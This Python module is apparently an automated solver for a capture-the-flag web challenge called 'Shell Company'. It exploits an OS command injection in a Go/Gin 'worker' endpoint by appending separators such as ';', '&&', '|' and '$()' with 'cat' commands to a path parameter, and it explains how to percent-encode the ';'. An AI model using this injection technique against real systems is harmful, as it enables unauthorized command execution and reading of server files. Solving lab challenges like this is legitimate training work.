"""D25 "Shell Company" (web-exploitation-day-16-shell-company): OS command injection in a "worker" route (Gin).

Kit shape: /api/clues = {current_role, example_path, feature_route, framework, input_parameter}; GET feature_route
(no params) -> 400 {"error":"path_required","example_path":"/app/static"}; GET feature_route?path=/app/static ->
{"ok":true,"effect":"worker_command_completed","stdout":"drwxr-xr-x ... /app/static"} (an `ls -ld <path>`).
GET feature_route?path=/app/static%3Bcat%20/run/huntress/objective.txt -> stdout gains "proof_...". The `;` MUST be
percent-encoded (a raw `;` in the query string is dropped by Go's parser -> path_required). Re-runnable on any
fresh target.
"""
import json
import re
import urllib.parse

from lib import websolve

READS = ("cat /run/huntress/objective.txt", "cat /run/huntress/*")
SEPS = (";{}", "\n{}", "&&{}", "|{}", "$({})")


def _route(cl, *pats):
    for p in pats:
        for k, v in cl.items():
            if re.search(p, k, re.I) and isinstance(v, str) and re.fullmatch(r"/[\w./-]+", v):
                return v
    return None


def exploit(base, clues):
    cl = clues if isinstance(clues, dict) else {}
    route = _route(cl, r"feature|process|worker|command|exec|action")
    if not route:
        return None
    url = urllib.parse.urljoin(base, route)
    param = next((v for k, v in cl.items() if re.search(r"input_param|param", k, re.I)
                  and isinstance(v, str) and re.fullmatch(r"\w+", v)), None)
    example = next((v for k, v in cl.items() if re.search(r"example", k, re.I) and isinstance(v, str)), None)
    if not param or not example:
        st, body, _ = websolve.fetch(url)
        p = websolve.proof(body)
        if p:
            return p
        try:
            j = json.loads(body or "")
        except ValueError:
            j = {}
        j = j if isinstance(j, dict) else {}
        if not param:   # the param its error names ("path_required" -> path)
            m = re.search(r"\b([a-z]\w*?)_required\b", body or "")
            param = m.group(1) if m else "path"
        example = example or next((v for k, v in j.items() if re.search(r"example", k) and isinstance(v, str)), "/")

    def go(val):
        st, body, _ = websolve.fetch(f"{url}?{urllib.parse.urlencode({param: val})}")
        if st == 405:
            st, body, _ = websolve.fetch(url, data={param: val}, method="POST")
        return st, body

    st, body = go(example)   # baseline: is this a shell-backed worker at all?
    p = websolve.proof(body)
    if p:
        return p
    if not re.search(r"stdout|command|output|worker", body or "", re.I):
        return None
    for sep in SEPS:
        for cmd in READS:
            st, body = go(example + sep.format(cmd))
            p = websolve.proof(body)
            if p:
                return p
            if st != 200 or not re.search(r"stdout", body or "", re.I):
                break   # separator rejected -> next separator; else it ran, try the next read with it
    return None


KEY_MAP = [(r"example_path|input_parameter|command|shell|exec", "day25_web_shell_company")]
HANDLERS = {"day25_web_shell_company": exploit}
